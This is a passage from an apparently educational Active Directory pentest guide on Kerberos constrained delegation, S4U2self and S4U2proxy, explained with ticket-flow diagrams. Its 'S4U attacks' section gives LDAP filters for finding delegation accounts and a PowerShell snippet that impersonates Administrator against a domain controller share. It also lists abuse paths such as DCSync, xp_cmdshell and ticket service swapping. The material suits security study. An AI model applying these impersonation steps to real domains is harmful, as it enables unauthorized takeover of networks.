<p>In this example, barsrv and udbarsrv are different servers to show that they
can be different machines, but the printer bug also could be used to indicate to
reconnect to the same machine that performs the RPC call. Moreover, also the KDCs
could be the servers that perform or receive the printer bug call. In this
example, many different machines were used in order to present the different
Kerberos messages and roles in the attack.</p>
<p>
In this respect, it is important to know that DCs (KDCs) have unconstrained
delegation enabled, so compromise a domain DC could lead to compromise the other
forests with bidirectional trusts that have TGT delegation enabled.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-kerberos-constrained-delegation" class="outline-5">
<h5 id="kerberos-constrained-delegation">
Kerberos Constrained Delegation
</h5>
<div id="outline-text-kerberos-constrained-delegation" class="outline-text-5">
<p>
As we have seen, Unconstrained Delegation can be a dangerous thing, since it
allows to completely impersonate a client. So in order to create a more
restrictive delegation mechanism, Microsoft develop two Kerberos extensions
known as <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">Service for User</a> (S4U):</p>
<ul>
<li>Service for User to Proxy (S4U2proxy)</li>
<li>Service for User to Self (S4U2self)</li>
</ul>
<p>By using these extensions, services can be restricted to only perform delegation
against a set of allowed third-services, and no user TGT is required, preventing
it from being stored on the service server. This is known as constrained
delegation.</p>
<div id="outline-container-s4u2proxy" class="outline-6">
<h6 id="s4u2proxy">
S4U2proxy
</h6>
<div id="outline-text-s4u2proxy" class="outline-text-6">
<p>
The S4U2proxy (Service for User to Proxy) extension allows a service to ask a
ST for another service on behalf of the client by using the client ST that was
sent to the service, instead of client TGT.</p>
<p>
Moreover, unlike unconstrained delegation, a service can only ask for an
impersonation ST for certain whitelisted services. The allowed services are
defined by the following attributes:</p>
<ul>
<li>The <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa">msDS-AllowedToDelegateTo</a> attribute of the service user account contains a
list of SPNs (services) for which it (and its services) can ask a ST on
behalf of the client. This <strong>list of services</strong> is used in the classic
Constrained Delegation. In order to modify msDS-AllowedToDelegateTo, the
<a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">SeEnableDelegationPrivilege</a> is required.</li>
<li>The service user account is listed in the in the
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/cea4ac11-a4b2-4f2d-84cc-aebb4a4ad405">msDS-AllowedToActOnBehalfOfOtherIdentity</a> attribute of the target service user
account. This <strong>list of users</strong> is used in Resource Based Constrained Delegation
(RBCD).</li>
</ul>
<p>The following commands (made with <a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps">ActiveDirectory module</a> of Powershell) show
examples of these attributes:</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator&gt; get-aduser anakin -Properties msDS-AllowedToDelegateTo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DistinguishedName        <span style="color:#960050;background-color:#1e0010">:</span> CN=Anakin,CN=Users,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>msDS-AllowedToDelegateTo <span style="color:#960050;background-color:#1e0010">:</span> {HTTP/webserver, HTTP/webserver.contoso.local}
</span></span><span style="display:flex;"><span>SamAccountName           <span style="color:#960050;background-color:#1e0010">:</span> anakin
</span></span><span style="display:flex;"><span>SID                      <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span>-<span style="color:#ae81ff">1103</span>
</span></span><span style="display:flex;"><span>UserPrincipalName        <span style="color:#960050;background-color:#1e0010">:</span> anakin@contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Example of msDS-AllowedToDelegateTo
</figcaption>
</figure>
<p>
Here, the services of user Anakin are allowed to perform delegation against the
"HTTP/webserver" service. Therefore, Anakin can impersonate any user (except the
<a href="#kerberos-anti-delegation-measures">protected ones</a>) against "HTTP/webserver".</p>
<pre class="example">msDS-AllowedToDelegateTo                .---.
                                       /   /|
         \o/      delegate to         .---. |
          |  -----------------------&gt; |   | '
         / \                          |   |/ 
        Anakn                         '---'  
                                    HTTP/webserver
</pre>
<p>
Moreover, since it is possible to <a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">change the target service</a> of a ticket, Anakin
could ask for a ticket for "HTTP/webserver" on behalf of the client and change
the target service to any service of the owner of "HTTP/webserver", since all
these services STs will be encrypted with the same <a href="#kerberos-keys">Kerberos key</a>.</p>
<p>
For example, if the user of "HTTP/webserver" is webserver$ (the user account of
the webserver computer), then Anakin could ask a ticket for "HTTP/webserver" on
behalf of a client, and use this ticket to access to the SMB service of the
webserver by changing the target service to "cifs/webserver". This way, Anakin
can have access to the webserver by impersonating the client.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator&gt; get-aduser han -Properties PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DistinguishedName                        <span style="color:#960050;background-color:#1e0010">:</span> CN=Han,CN=Users,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>Enabled                                  <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>GivenName                                <span style="color:#960050;background-color:#1e0010">:</span> Han
</span></span><span style="display:flex;"><span>msDS-AllowedToActOnBehalfOfOtherIdentity <span style="color:#960050;background-color:#1e0010">:</span> System.DirectoryServices.ActiveDirectorySecurity
</span></span><span style="display:flex;"><span>Name                                     <span style="color:#960050;background-color:#1e0010">:</span> Han
</span></span><span style="display:flex;"><span>ObjectClass                              <span style="color:#960050;background-color:#1e0010">:</span> user
</span></span><span style="display:flex;"><span>ObjectGUID                               <span style="color:#960050;background-color:#1e0010">:</span> 356a7fb7-6cc0-<span style="color:#ae81ff">4e09</span>-a77f-b64e1677f2a8
</span></span><span style="display:flex;"><span>PrincipalsAllowedToDelegateToAccount     <span style="color:#960050;background-color:#1e0010">:</span> {CN=Anakin,CN=Users,DC=contoso,DC=local}
</span></span><span style="display:flex;"><span>SamAccountName                           <span style="color:#960050;background-color:#1e0010">:</span> han
</span></span><span style="display:flex;"><span>SID                                      <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span>-<span style="color:#ae81ff">1109</span>
</span></span><span style="display:flex;"><span>Surname                                  <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>UserPrincipalName                        <span style="color:#960050;background-color:#1e0010">:</span> han@contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Example of msDS-AllowedToActOnBehalfOfOtherIdentity
</figcaption>
</figure>
<blockquote>
<p>Since msDS-AllowedToActOnBehalfOfOtherIdentity value is a <a href="#security-descriptor">security descriptor</a>
with a <a href="https://www.gabescode.com/active-directory/2019/07/25/nt-security-descriptors.html">binary format</a>, you need to request the property
PrincipalsAllowedToDelegateToAccount, that prints this data in a human friendly
format</p>
</blockquote>
<p>
On the other hand, by checking the msDS-AllowedToActOnBehalfOfOtherIdentity of
the Han user, we discover that it allows the Anakin user perform delegation
against all of its services.</p>
<p>
Therefore, Anakin can impersonate any user (except the <a href="#kerberos-anti-delegation-measures">protected ones</a>) against
any service of the Han user.</p>
<pre class="example">                         msDS-AllowedToActOnBehalfOfOtherIdentity

  \o/           delegate to                o
   |   --------------------------------&gt;  /|\ 
  / \                                     / \
 Anakin                                   Han
</pre>
<p>
Additionally, the KDC also checks another parameters to determine the result of
a S4U2proxy request. It also takes into account if the client ST is FORWARDABLE
and if the <a href="#kerberos-anti-delegation-measures">client is protected</a> against delegation. You can check the rules in the
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c6f6f8b3-1209-487b-881d-d0908a413bb7">MS-SFU specification</a>. As a summary, the rules are the following:</p>
<ol>
<li>If not valid <a href="#pass-the-ticket">Ticket Signature in PAC</a> of client ST =&gt; return error
KRB-AP-ERR-MODIFIED.</li>
<li>If client ST is not FORWARDABLE and client is protected =&gt; return error
KRB-ERR-BADOPTION - STATUS-ACCOUNT-RESTRICTED.</li>
<li>If client ST is not FORWARDABLE and target_service in ms-AllowedToDelegateTo
=&gt; return error KRB-ERR-BADOPTION - STATUS-ACCOUNT-RESTRICTED. (This one was
discovered by experimenting)</li>
<li>If client ST FORWARDABLE and target_service in ms-AllowedToDelegateTo =&gt;
return S4U2proxy ST.</li>
<li>If service user in target_service user
msDS-AllowedToActOnBehalfOfOtherIdentity =&gt; return S4U2proxy ST.</li>
</ol>
<p>
One curious thing to note is that it is possible to retrieve a <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#serendipity">S4U2proxy ST
from a non FORWARDABLE client ST</a> by using Resource Based Constrained
Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity). Except in the case that
the target service is also listed in ms-AllowedToDelegateTo (rule 3), where an
error will be returned.</p>
<p>
Besides, prior to <a href="#pass-the-ticket">PAC Ticket Signature</a> check implementation, it was possible for
a service user to <a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">modify the client ST</a> (since it was encrypted with its
Kerberos key) and make it FORWARDABLE. However, Microsoft introduced this Ticket
Signature in the PAC (signed by the KDC key) to verify that ST was not
tampered.</p>
<p>
Moreover, you can notice that <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#a-forwardable-result">S4U2proxy returns forwardable tickets</a>. (Even if the
<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ce6bbf34-0f11-40d6-93d1-165a3afa0223">specification has been updated</a> since Elad Shamir pointed out this fact, it seems
that this is still correct, at least from my experiments.)</p>
<p>
Let's now view an example of the S4U2proxy process:</p>
<figure>
<pre class="example">                KDC
                .---. &lt;-----2) TGS-REQ--------------------.
               /   /|    + SPN: MSSQLSvc/dbsrv            |
              .---. |    + TGT websrv$                    |
              |   | '    + ST client &gt; http/websrv        |
              |   |/                                      |
              '---'  &gt;-----3) TGS-REP------------------.  |
                       + ST client &gt; MSSQLSvc/dbsrv    v  ^
                                                      .---.
  ____                                               /   /|
 |    | &gt;-----------1) AP-REQ---------------------&gt; .---. |
 |____|     + ST client &gt; http/websrv               |   | '
 /::::/                                             |   |/ 
 client                                             '---'  
                                                    websrv
                .---.                                  v
               /   /|                                  |
              .---. |&lt;-----4) AP-REQ-------------------'
              |   | '   + ST client &gt; MSSQLSvc/dbsrv
              |   |/ 
              '---'  
              dbsrv
</pre>
<figcaption>
S4U2proxy process
</figcaption>
</figure>
<ol>
<li>The client authenticates against the web server service (http/websrv) by
sending a ST.</li>
<li>Later, when the web server (http/websrv) needs to access to the database
service (MSSQLSvc/dbsrv) on behalf of the client, it asks for a ST for
MSSQLSvc/dbsrv by using the client ST, and its own TGT.</li>
<li>
<p>The KDC checks that the service user websrv$ is allowed to ask delegation
tickets for MSSQLSvc/dbsrv by following the previous discussed rules and
returns the client ST for MSSQLSvc/dbsrv. To sum up, usually one of these
conditions should be meet:</p>
<ol>
<li>MSSQLSvc/dbsrv is included in the msDS-AllowedToDelegateTo attribute of
websrv$ (the service user of the web server). This is classic Constrained
Delegation. </li>
<li>websrv$ is included in the msDS-AllowedToActOnBehalfOfOtherIdentity
attribute of dbsrv$ (the service user of the MSSQLSvc/dbsrv service). This
is Resource Based Constrained Delegation.</li>
</ol>
</li>
<li>The web service uses the recently acquired ST to authenticate itself against
the database by impersonating the client.</li>
</ol>
<p>
Moreover, it also possible to use S4U2proxy across domains, however, in this
case <a href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview#resource-based-constrained-delegation-across-domains">only Resource Based Constrained Delegation can be used</a>.</p>
<figure>
<pre class="example">                                                  KDC foo.com
       .--------------1) TGS-REQ-------------------&gt; .---.
       |          + SPN: MSSQLSvc/dbsrv.bar.com     /   /|
       |          + TGT websrv$ &gt; foo.com          .---. |
       |          + ST client &gt; http/websrv        |   | '
       |                                           |   |/ 
       |   .----2) TGS-REP-----------------------&lt; '---'  
       |   |  + TGT websrv$ (client) &gt; bar.com     ^   v
       ^   v                                       |   |
        .---.                                      |   |
       /   /| &gt;----3) TGS-REQ----------------------'   |
      .---. |      + SPN: krbtgt/bar.com               |
      |   | '      + TGT websrv$ &gt; foo.com             |
      |   |/                                           |
      '---'   &lt;-----4) TGS-REP-------------------------'
      websrv        + TGT websrv$ &gt; bar.com                      .---.
    (foo.com)                                                   /   /|
      ^  v  v                                                  .---. |
      |  |  '-------------7) AP-REQ--------------------------&gt; |   | '
      |  |          + ST client &gt; MSSQLSvc/dbsrv.bar.com       |   |/ 
      |  |                                                     '---'  
      |  '-------5) TGS-REQ-----------------------&gt; .---.      dbsrv
      |      + SPN: MSSQLSvc/dbsrv.bar.com         /   /|    (bar.com)
      |      + TGT websrv$ &gt; bar.com              .---. |
      |      + TGT websrv$ (client) &gt; bar.com     |   | '
      |                                           |   |/ 
      '---6) TGS-REP----------------------------&lt; '---'  
        + ST client &gt; MSSQLSvc/dbsrv.bar.com   KDC bar.com
</pre>
<figcaption>
S4u2proxy across domains
</figcaption>
</figure>
<ol>
<li>We assume that client already sends its ST to an websrv service. Then websrv
needs to access to the database service MSSQLSvc/dbsrv on behalf of the user.</li>
<li>websrv ask for a ST for MSSQLSvc/dbsrv on behalf of the client, by including
its own ST.</li>
<li>The KDC examines the request and determines that the asked service is in
<code class="verbatim">bar.com</code> so it returns an special inter-realm TGT for asking S4U2proxy to
the <code class="verbatim">bar.com</code> KDC. </li>
<li>websrv inspects the response and discovers this special inter-realm TGT for
S4U2proxy. But it also needs a normal inter-realm TGT for <code class="verbatim">bar.com</code>, so it
asks for one to the KDC.</li>
<li>The KDC returns a inter-realm TGT to <code class="verbatim">bar.com</code> for websrv$.</li>
<li>Then websrv$ uses these inter-realm TGTs to ask the <code class="verbatim">bar.com</code> KDC for a ST for
MSSQLSvc/dbsrv in behalf of the client. </li>
<li>The KDC examines the requests and determines that websrv$ is allowed to
delegate to MSSQLSvc/dbsrv service (using RBCD), so it issues a ST for
MSSQLSvc/dbsrv.</li>
<li>websrv uses this new ST to access MSSQLSvc/dbsrv service on behalf of the
client.</li>
</ol>
</div>
</div>
<div id="outline-container-s4u2self" class="outline-6">
<h6 id="s4u2self">
S4U2self
</h6>
<div id="outline-text-s4u2self" class="outline-text-6">
<p>
The Kerberos S4U2self extension allows a service to request a ticket on behalf
of the user for itself, that can be used then in S4U2proxy. This is done in
order to allow to perform Kerberos delegation for those client that doesn't
support the Kerberos protocol. It is also known as protocol transition.</p>
<p>
In order to be able to use S4U2self, the KDC checks the <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">UserAccountControl</a>
TRUSTED_TO_AUTH_FOR_DELEGATION flag of the service user account. In order to
modify this flag, the <a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">SeEnableDelegationPrivilege</a> is required.</p>
<p>
Additionally, the KDC also checks the if service user has any services and the
value of the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa">msDS-AllowedToDelegateTo</a> attribute. The specific rules can be seen
in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c98bade9-cad1-4745-bd4d-d13926103022">MS-SFU specification</a>, but here is a summary of checks performed by the KDC
when a S4U2self request is received: </p>
<ol>
<li>If service user does not have any services =&gt; return error
KDC-ERR-S-PRINCIPAL-UNKNOWN.</li>
<li>If client is <a href="#kerberos-anti-delegation-measures">protected against delegation</a> =&gt; return non-FORWARDABLE ST.</li>
<li>If service user TRUSTED_TO_AUTH_FOR_DELEGATION flag is set =&gt; return
FORWARDABLE ST.</li>
<li>If service user TRUSTED_TO_AUTH_FOR_DELEGATION flag is not set and service
user has services in ms-AllowedToDelegateTo =&gt; return non-FORWARDABLE ST.
(This ST can still be
 <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#serendipity">used for S4U2proxy with Resource Based Constrained Delegation</a>) </li>
<li>If service user TRUSTED_TO_AUTH_FOR_DELEGATION flag is not set and service
user ms-AllowedToDelegateTo is empty =&gt; return FORWARDABLE ST.</li>
</ol>
<p>Let's view an example:</p>
<figure>
<pre class="example">                                                                KDC
                          .---. &gt;---2) TGS-REQ--------------&gt;  .---.
                         /   /|     + SPN: HTTP/websrv        /   /|
  ____                  .---. |     + For user: client       .---. |
 |    | &gt;-1) SPNEGO--&gt;  |   | '     + TGT websrv$            |   | '
 |____|     (NTLM)      |   |/                               |   |/ 
 /::::/                 '---'  &lt;----3) TGS-REP-------------&lt; '---'  
 client                websrv   + ST client &gt; HTTP/websrv
</pre>
<figcaption>
S4U2self process
</figcaption>
</figure>
<ol>
<li>The client is authenticated against the HTTP/websrv service by using NTLM (or
any other authentication protocol) since it doesn't support Kerberos.</li>
<li>The websrv requests a S4U2self ST for the client by sending a TGS-REQ to the
KDC.</li>
<li>The KDC examines the requests, the websrv$ TRUSTED_TO_AUTH_FOR_DELEGATION
flag and if the client is protected against delegation. If everything is
correct, the KDC returns a HTTP/websrv ST for the client, which may or may
not be FORWARDABLE depending on the variables mentioned.</li>
</ol>
<p>Moreover, S4U2Self can be used across domains. Let's see how this works:</p>
<figure>
<pre class="example">                                                           ____       
                                                          |    |
                                   .-----1) SPNEGO------&lt; |____|
                                   |       (NTLM)         /::::/
                                   |                   client (bar)
                                   |
                                   |
  foo KDC                          v                                    bar KDC
   .---. &lt;----2) TGS-REQ------&lt;  .---. &gt;---------4) TGS-REQ------------&gt;  .---.
  /   /|  + SPN: krbtgt/bar     /   /|        + SPN: HTTP/websrv         /   /|
 .---. |  + TGT websrv$ &gt; foo  .---. |        + For user: client        .---. |
 |   | '                       |   | '        + TGT websrv$ &gt; bar       |   | '
 |   |/                        |   |/                                   |   |/ 
 '---'  &gt;-----3) TGS-REP-----&gt; '---'  &lt;----------5) TGS-REP-----------&lt; '---'  
 v   ^   + TGT websrv$ &gt; bar  websrv    + TGT websrv$ (client) &gt; foo
 |   |                         (foo)
 |   |                         v   ^
 |   |                         |   |
 |   '--&lt;&lt;--6) TGS-REQ---&lt;&lt;----'   |                  
 |  + SPN: HTTP/websrv             | 
 |  + For user: client             |     
 |  + TGT websrv$ (client) &gt; foo   |
 |                                 |
 '-----&gt;&gt;---7) TGS-REP----&gt;&gt;-------'                
   + ST client &gt; HTTP/websrv
</pre>
<figcaption>
S4U2self across domains
</figcaption>
</figure>
<ol>
<li>The client is authenticated against the HTTP/websrv service by using NTLM (or
any other authentication protocol) since it doesn't support Kerberos.</li>
<li>websrv determines that the realm of client is <code class="verbatim">bar</code>, so it sends a TGS-REQ
asking for a TGT for <code class="verbatim">bar</code> domain.</li>
<li>The KDC returns an inter-realm TGT for <code class="verbatim">bar</code> to websrv.</li>
<li>websrv uses its new inter-realm TGT to ask to <code class="verbatim">bar</code> KDC for a HTTP/websrv ST
for the client.</li>
<li>The bar KDC determines that the HTTP/websrv service is in the <code class="verbatim">foo</code> domain,
so it cannot issue a ST for HTTP/websrv service, but it returns a referral
TGT for <code class="verbatim">foo</code> domain that indicates that a HTTP/websrv ST for the client was
requested. </li>
<li>Then, websrv uses this referral TGT issued by the <code class="verbatim">bar</code> KDC to ask for a ST
for client to the <code class="verbatim">foo</code> KDC.</li>
<li>The foo KDC inspects the request and the referral TGT and determines that an
HTTP/websrv ST for client can be issued.   </li>
</ol>
</div>
</div>
<div id="outline-container-s4u2self-and-s4u2proxy" class="outline-6">
<h6 id="s4u2self-and-s4u2proxy">
S4U2self and S4U2proxy
</h6>
<div id="outline-text-s4u2self-and-s4u2proxy" class="outline-text-6">
<p>
Now that we know how S4U2self and S4U2proxy works, let's view and example of
them used together.</p>
<figure>
<pre class="example">                                                  KDC
   .------&gt;&gt;----1) TGS-REQ-----&gt;&gt;---------------&gt; .---.
   |            + SPN: HTTP/websrv               /   /|
   |            + For user: admin               .---. |
   |            + TGT websrv$                   |   | '
   |                                            |   |/ 
   |   .--&lt;&lt;----2) TGS-REP-----&lt;&lt;-------------&lt; '---'  
   |   |        + ST admin &gt; HTTP/websrv        ^   v
   |   |                                        |   |
   |   |                                        |   |
   ^   v                                        |   |
   .---. &gt;-&gt;&gt;---3) TGS-REQ-----&gt;&gt;---------------'   |
  /   /|        + SPN: MSSQLSvc/dbsrv               |
 .---. |        + TGT websrv$                       |
 |   | '        + ST admin &gt; HTTP/websrv            |
 |   |/                                             |
 '---'  &lt;--&lt;&lt;---4) TGS-REP-----&lt;&lt;-------------------'
 websrv         + ST admin &gt; MSSQLSvc/dbsrv
   v
   |
   |                                      .---.
   |                                     /   /|
   '------------5) AP-REQ-------------&gt; .---. |
       + ST admin &gt; MSSQLSvc/dbsrv      |   | '
                                        |   |/ 
                                        '---'  
                                        dbsrv
</pre>
<figcaption>
S4U2self chained with S4U2proxy
</figcaption>
</figure>
<ol>
<li>The websrv requests a HTTP/websrv ST for the admin user to KDC by using 
S4U2self through a TGS-REQ.</li>
<li>The KDC examines the requests, the websrv$ TRUSTED_TO_AUTH_FOR_DELEGATION
flag and if admin is protected against delegation. If everything is correct,
the KDC returns a HTTP/websrv ST for the client, which may or may not be
FORWARDABLE depending on the variables mentioned in <a href="#s4u2self">S4U2Self</a>.</li>
<li>Then, websrv asks for a MSSQLSvc/dbsrv ST on behalf of admin by using the
S4U2self ST, and its own TGT. </li>
<li>The KDC checks that the service user websrv$ is allowed to ask delegation
tickets for MSSQLSvc/dbsrv following the rules mentioned in <a href="#s4u2proxy">S4U2Proxy</a>. Then,
it returns a MSSQLSvc/dbsrv ST for admin.</li>
<li>websrv uses the MSSQLSvc/dbsrv ST to authenticate itself against
the database by impersonating the admin.</li>
</ol>
<p>Therefore, as we can see, it is possible to chain S4U2self and S4U2proxy so you
can impersonate any user (except those <a href="#kerberos-anti-delegation-measures">protected against delegation</a>) against all
of those services that the service user is allowed to perform the constrained
delegation.</p>
<p>
And, of course, it is also possible to <a href="https://exploit.ph/crossing-trusts-4-delegation.html">use S4U2self and S4U2proxy across
domains</a>.</p>
</div>
</div>
<div id="outline-container-s4u-attacks" class="outline-6">
<h6 id="s4u-attacks">
S4U attacks
</h6>
<div id="outline-text-s4u-attacks" class="outline-text-6">
<p>
Let's view know how the Constrained Delegation and S4U extensions can be abused
in a pentest.</p>
<p>
In order to find accounts that use Constrained Delegation, you must search for
account with the UserAccountControl TRUSTED_TO_AUTH_FOR_DELEGATION enabled
(S4U2self/Protocol Transition) or with values in the attributes
msDS-AllowedToDelegateTo (Classic Constrained Delegation) or
msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD). Here is an LDAP filter you can
use to search for Constrained Delegation accounts:</p>
<figure>
<div class="src src-ldap">
<pre tabindex="0"><code class="language-ldap" data-lang="ldap">(|
  (UserAccountControl:1.2.840.113556.1.4.803:=16777216)
  (msDS-AllowedToDelegateTo=*)
  (msDS-AllowedToActOnBehalfOfOtherIdentity=*)
)</code></pre>
</div>
<figcaption>
LDAP filter to retrieve accounts related to Constrained Delegation
</figcaption>
</figure>
<p>
In order to find Constrained Delegation related accounts, you can use tools like
<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1">Powerview</a> , <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py">impacket findDelegation.py</a> script, the <a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps">Powershell ActiveDirectory
module</a> or <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>.</p>
<figure>
<div class="src src-ldap">
<pre tabindex="0"><code class="language-ldap" data-lang="ldap">(|
  (memberof:1.2.840.113556.1.4.1941:=CN=Protected Users,CN=Users,DC=&lt;domain&gt;,DC=&lt;dom&gt;)
  (userAccountControl:1.2.840.113556.1.4.803:=1048576)
)</code></pre>
</div>
<figcaption>
LDAP filter to retrieve accounts protected against delegation
</figcaption>
</figure>
<p>
Once you located the accounts and want to perform some related Kerberos
operations, there are many tools that allows to perform ticket requests through
the S4U extensions and get ST for arbitrary users to impersonate them. You can
use the <a href="https://labs.f-secure.com/archive/trust-years-to-earn-seconds-to-break/#:~:text=Practical%20Exploitation">MIT kerberos utils</a> (<a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/ktutil.html">ktutitl</a>, <a href="https://web.mit.edu/kerberos/krb5-devel/doc/user/user_commands/kinit.html">kinit</a>, <a href="https://web.mit.edu/kerberos/krb5-devel/doc/user/user_commands/kvno.html">kvno</a>), <a href="https://github.com/GhostPack/Rubeus#s4u">Rubeus</a>, <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py">getST.py</a> impacket
script or <a href="https://gitlab.com/Zer1t0/cerbero/">cerbero</a>.</p>
<p>
Additionally, in case of being execute commands as SYSTEM account in a computer
with Constrained Delegation (therefore in the context of the computer account in
Active Directory), it is possible to use S4U2self and S4U2proxy with a
<a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/#:~:text=Scenario%202">little of Powershell code</a>:</p>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Code made by Lee Christensen (@tifkin_) and Will Schroeder (@harmj0y)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Source: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># translated from the C# example at https://msdn.microsoft.com/en-us/library/ff649317.aspx</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># load the necessary assembly</span>
</span></span><span style="display:flex;"><span>$Null = [<span style="color:#66d9ef">Reflection.Assembly</span>]::LoadWithPartialName(<span style="color:#e6db74">'System.IdentityModel'</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user</span>
</span></span><span style="display:flex;"><span>$Ident = New-Object System.Security.Principal.WindowsIdentity @(<span style="color:#e6db74">'Administrator@FOO.LOCAL'</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># actually impersonate the next context</span>
</span></span><span style="display:flex;"><span>$Context = $Ident.Impersonate()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># implicitly invoke S4U2Proxy with the specified action</span>
</span></span><span style="display:flex;"><span>ls \\DC01.FOO.LOCAL\C$
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># undo the impersonation context</span>
</span></span><span style="display:flex;"><span>$Context.Undo()</span></span></code></pre></div>
</div>
<p>
The good thing about Constrained Delegation is that in many cases (RBCD or
TrustedToAuthForDelegation enabled) you can impersonate users without any
interaction. However, since the quantity of services you can access is limited
you must be aware of those sensible services that can be useful in delegation:  </p>
<dl>
<dt>
LDAP of a domain controller
</dt>
<dd>The <a href="#ldap">LDAP</a> service of Active Directory is used to
manage the accounts, including its permissions, so if you can impersonate an
Administrator against the LDAP service, you can give any privileges to any
user account that you control. An example is to give rights to an
arbitrary to perform a <a href="https://adsecurity.org/?p=1729">DCSync attack</a> and compromise the domain. </dd>
<dt>
SMB of any computer
</dt>
<dd>In case of being allowed to impersonate any user
against the SMB (cifs in the SPN) service of a computer, you can access to all
the files in the computer, execute commands by using tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">psexec</a> and
perform other actions over RPC calls.</dd>
<dt>
MSSQL services
</dt>
<dd>Apart from contain sensitive data that can be an important
flag to obtain in a pentest, <a href="#sql-server">MSSQL</a> servers can also allow to users to execute
commands via <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a> command, abuse NTLM relay by performing HTTP
requests <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe">via xp_dirtree to a WebDAV server</a>, and <a href="https://github.com/NetSPI/PowerUpSQL">many other options</a>.</dd>
<dt>
krbtgt service
</dt>
<dd>If a account is allowed to delegate to the krbtgt service,
it can ask <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">TGTs for any account</a> that it is allowed to impersonate.</dd>
</dl>
<p>
And remember that, even if you are not allowed to delegate directly to one of
these services through Classic Constrained Delegation (ms-AllowedToDelegateTo
attribute), but to one service of the same user, you can change the <a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">target
service in the ticket</a>. For instance, if you are allowed to delegate to the HTTP
service of a computer, e.g HTTP/websrv, you could change the target service to
CIFS/websrv to access the computer (if the HTTP service is being execute in the
context of the computer account). Also, if you can delegate any service of a DC,
